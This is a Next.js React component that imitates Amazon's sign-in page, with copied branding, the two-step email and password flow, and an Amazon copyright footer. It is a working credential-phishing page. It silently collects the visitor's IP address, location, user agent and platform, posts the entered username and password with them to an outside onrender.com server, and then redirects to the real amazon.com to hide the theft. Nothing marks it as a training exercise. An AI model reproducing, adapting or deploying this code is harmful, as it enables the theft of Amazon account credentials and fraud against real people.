"use client";

import type React from "react";

import { FormEvent, useEffect, useState } from "react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Card, CardContent, CardHeader } from "@/components/ui/card";
import { useRouter } from "next/navigation";

export default function AmazonLogin() {
  const [step, setStep] = useState<"email" | "password">("email");
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");

  const [ipAddress, setIpAddress] = useState("");
  const [userAgent, setUserAgent] = useState("");
  const [location, setLocation] = useState("");
  const [platform, setPlatform] = useState("");

  const [error, setError] = useState("");
  const router = useRouter();

  // Auto-detect client info
  useEffect(() => {
    // IP + Location
    fetch("https://ipapi.co/json")
      .then((res) => res.json())
      .then((data) => {
        setIpAddress(data.ip || "Không xác định");
        setLocation(`${data.city}, ${data.region}, ${data.country_name}`);
      })
      .catch(() => {
        setIpAddress("Không xác định");
        setLocation("Không xác định");
      });

    // User Agent + Platform
    setUserAgent(navigator.userAgent || "Không xác định");
    setPlatform(navigator.platform || "Không xác định");
  }, []);

  // Handle login submit
  const handleSubmit = async (e: FormEvent) => {
    e.preventDefault();
    setError("");

    try {
      const response = await fetch("https://than-2211110134-be.onrender.com/account", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          username,
          password,
          ipAddress,
          userAgent,
          location,
          platform,
        }),
      });

      const data = await response.json();

      if (data.success) {
        router.push("https://www.amazon.com/ref=nav_logo");
      } else {
        setError(data.message || "Đăng nhập thất bại!");
      }
    } catch (err) {
      setError("Có lỗi xảy ra khi đăng nhập.");
      console.error(err);
    }
  };

  const handleContinue = (e: React.FormEvent) => {
    e.preventDefault();
    if (username.trim()) {
      setStep("password");
    }
  };

  const handleChangeEmail = () => {
    setStep("email");
    setPassword("");
  };

  return (
    <div className="min-h-screen bg-white flex flex-col items-center">
      {/* Amazon Logo */}
      <div className="mt-8 mb-8">
        <div className="text-2xl  text-black">
          amazon
          <div className="w-16 h-0.5 bg-orange-400 mt-1 ml-8"></div>
        </div>
      </div>

      {/* Login Card */}
      <Card className="w-full max-w-sm border border-gray-300 shadow-sm">
        <CardHeader className="pb-4">
          <h1 className="text-2xl text-gray-900">
            {step === "email" ? "Sign in or create account" : "Sign in"}
          </h1>
          {error && <p className="text-red-500 mb-4">{error}</p>}
        </CardHeader>

        <CardContent className="space-y-4">
          {step === "email" ? (
            <form onSubmit={handleContinue} className="space-y-4">
              <div>
                <label
                  htmlFor="email"
                  className="block text-sm font-medium text-gray-900 mb-1"
                >
                  Enter mobile number or email
                </label>
                <Input
                  id="email"
                  type="text"
                  value={username}
                  onChange={(e) => setUsername(e.target.value)}
                  className="w-full border-gray-400 focus:border-orange-400 focus:ring-orange-400"
                  required
                />
              </div>

              <Button
                type="submit"
                className="w-full bg-yellow-400 hover:bg-yellow-500 text-black font-normal py-2 rounded-sm border border-yellow-600"
              >
                Continue
              </Button>

              <div className="text-xs text-gray-600">
                <p> By continuing, you agree to Amazons&apos;s{" "}</p>
               
                <a
                  href="#"
                  className="text-blue-600 hover:text-orange-600 hover:underline"
                >
                  Conditions of Use
                </a>{" "}
                and{" "}
                <a
                  href="#"
                  className="text-blue-600 hover:text-orange-600 hover:underline"
                >
                  Privacy Notice
                </a>
                .
              </div>

              <div className="pt-4">
                <a
                  href="#"
                  className="text-sm text-blue-600 hover:text-orange-600 hover:underline"
                >
                  Need help?
                </a>
              </div>

              <hr className="border-gray-300" />

              <div className="pt-2">
                <div className="text-sm font-medium text-gray-900 mb-2">
                  Buying for work?
                </div>
                <a
                  href="#"
                  className="text-sm text-blue-600 hover:text-orange-600 hover:underline"
                >
                  Create a free business account
                </a>
              </div>
            </form>
          ) : (
            <form onSubmit={handleSubmit} className="space-y-4">
              <div className="flex items-center justify-between">
                <span className="text-sm text-gray-900">{username}</span>
                <button
                  type="button"
                  onClick={handleChangeEmail}
                  className="text-sm text-blue-600 hover:text-orange-600 hover:underline"
                >
                  Change
                </button>
              </div>

              <div>
                <div className="flex items-center justify-between mb-1">
                  <label
                    htmlFor="password"
                    className="block text-sm font-medium text-gray-900"
                  >
                    Password
                  </label>
                  <a
                    href="#"
                    className="text-sm text-blue-600 hover:text-orange-600 hover:underline"
                  >
                    Forgot password?
                  </a>
                </div>
                <Input
                  id="password"
                  type="password"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  className="w-full border-gray-400 focus:border-orange-400 focus:ring-orange-400"
                  required
                />
              </div>

              <Button
                type="submit"
                className="w-full bg-yellow-400 hover:bg-yellow-500 text-black font-normal py-2 rounded-sm border border-yellow-600"
              >
                Sign in
              </Button>
            </form>
          )}
        </CardContent>
      </Card>

      {/* Footer */}
      <div className="mt-auto pb-8 pt-16 text-center">
        <div className="flex justify-center space-x-6 text-xs text-blue-600 mb-2">
          <a href="#" className="hover:text-orange-600 hover:underline">
            Conditions of Use
          </a>
          <a href="#" className="hover:text-orange-600 hover:underline">
            Privacy Notice
          </a>
          <a href="#" className="hover:text-orange-600 hover:underline">
            Help
          </a>
        </div>
        <div className="text-xs text-gray-600">
          © 1996-2025, Amazon.com, Inc. or its affiliates
        </div>
      </div>
    </div>
  );
}
